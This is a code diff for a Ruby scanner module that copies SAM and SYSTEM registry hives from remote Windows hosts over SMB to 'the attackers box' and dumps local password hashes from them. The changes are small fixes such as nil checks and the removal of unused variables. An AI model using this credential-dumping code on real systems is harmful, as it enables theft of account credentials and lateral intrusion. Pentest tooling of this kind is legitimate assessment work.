@@ -31,10 +31,6 @@ class HashesWorkstation < Poet::Scanner
 	end
 
 	def run(username, password, host)
-		# local vars
-		pwdump = Menu.extbin[:pwdump]
-		cachedump = Menu.extbin[:cachedump]
-
 		# Check directory structure
 		create_folder("#{@log}/hashes") unless folder_exists("#{@log}/hashes")
 		create_folder("#{@log}/hashes/#{host}") unless folder_exists("#{@log}/hashes/#{host}")
@@ -55,7 +51,7 @@ class HashesWorkstation < Poet::Scanner
 				sleep 3
 			end
 
-			temp_directory.gsub!('C:', '')
+			temp_directory.gsub!('C:', '') if temp_directory
 
 			# download registry hives to attackers box
 			sam = smbclient(clientoptions, "get #{temp_directory}\\sam #{@log}/hashes/#{host}/sam")
@@ -86,7 +82,8 @@ class HashesWorkstation < Poet::Scanner
 				print_bad("#{host.ljust(15)} - Issues Exporting Hashes")
 				@failed = @failed + 1
 			end
-
+			
+			hashdump = ''
 			full_print_line = ''
 			has_hashes = false
 
@@ -97,7 +94,7 @@ class HashesWorkstation < Poet::Scanner
 				sys = Hashdump::Hive.new("#{@log}/hashes/#{host}/system")
 				hashdump = hashdumper.dump_creds(sam, sys)
 				# Strip null characters from dump
-				hashdump.strip_chars!("\x00")
+				hashdump.strip_chars!("\x00") unless hashdump.empty?
 
 				if hashdump.lines.count > 0 
 					full_print_line << "#{highlight(hashdump.lines.count)} Local, ".ljust(10)
